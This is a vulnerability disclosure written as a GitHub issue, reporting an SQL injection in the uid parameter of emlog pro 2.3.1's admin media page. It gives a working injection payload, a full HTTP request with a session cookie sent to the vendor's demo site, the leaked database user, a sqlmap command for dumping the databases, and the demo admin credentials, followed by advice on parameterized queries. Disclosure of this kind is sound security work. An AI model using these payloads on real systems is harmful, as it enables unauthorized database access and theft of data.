## github issue url :
https://github.com/emlog/emlog/issues/293
## Vulnerability Title: SQL injection vulnerabilities in emlog

- #### Vulnerability Type: SQL Injection
- #### Vendor Homepage: https://www.emlog.net/
- #### Software Link: https://github.com/emlog/emlog
- #### Affected Software/Version: pro2.3.1

## Application Demo and credentials

- URL   
https://demo.emlog.cn/admin/account.php?action=signin   
username:emlog   
password:emlogpro   

## Technical Details & Exploit:
- parameter   
  uid   
- payload   
  `uid=1+AND+GTID_SUBSET(CONCAT(0x7E,(SELECT+(ELT(2908=2908,user()))),0x7E),2908)`
- Request message：   
```
GET /admin/media.php?uid=1+AND+GTID_SUBSET(CONCAT(0x7E,(SELECT+(ELT(2908=2908,user()))),0x7E),2908) HTTP/2
Host: demo.emlog.cn
Cookie: PHPSESSID=olin640b9imq8if8g6hrs0thq0; EM_AUTHCOOKIE_hua9xrHVX4Cn8wWSnuX5vdPuy8NNnCeu=emlog%7C1743216985%7Cc724c92f1e862be91d66b3ca6475682d
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/jxl,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Sec-Gpc: 1
Referer: https://demo.emlog.cn/admin/media.php?active_del=1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
```
- Server response   
  we got the current_user :
  `demo_emlog_cn@localhost`
<img width="1035" alt="image" src="https://github.com/fubxx/CVE/assets/135971045/30382685-36cf-4ada-9ae4-bb1eb4f70c2f">
  We can also directly use the sqlmap tool to obtain database data：      
  `python3 sqlmap.py -r 1.txt --dbs --batch`    
  <img width="993" alt="image" src="https://github.com/fubxx/CVE/assets/135971045/ee892f8e-6079-4d4c-95f9-58d15ce3f513">
- location on web application   
  <img width="1282" alt="image" src="https://github.com/fubxx/CVE/assets/135971045/057a206e-e732-4a3c-9d5f-a3cfea2dd2f2">
  
## Impact:
SQL injection vulnerabilities can allow attackers to bypass authentication mechanisms of database and retrieve sensitive data from the database. This data might include personal user information, credit card numbers, passwords, and other confidential information that the database stores.

## Mitigation/Solution:
`include/model/media_model.php` Direct uid concatenation results in sql injection
<img width="1242" alt="image" src="https://github.com/fubxx/CVE/assets/135971045/db170a16-a27e-4517-bf6c-12f6e05269cb">
To safeguard against SQL injections and other common security vulnerabilities, here are some universally applicable remediation strategies to enhance the security of your applications:

1. Use Parameterized Queries (Prepared Statements)

- Description: One of the most effective methods to prevent SQL injection. By using precompiled SQL statements and parameters, external inputs are handled correctly, preventing them from being interpreted as part of the SQL code.
- Implementation: When crafting database queries, avoid directly concatenating external inputs into the SQL string. Instead, leverage the features of parameterized queries, such as using prepared statements in PHP with PDO or MySQLi.

2. Proper Data Validation and Sanitization

- Description: Validate all external inputs to ensure they meet the expected format and type. Inputs that don't comply should be rejected and logged as anomalies.
- Implementation: Utilize regular expressions, type checks, and value range checks to validate inputs. Sanitization might include escaping specific characters, stripping illegal inputs, etc.
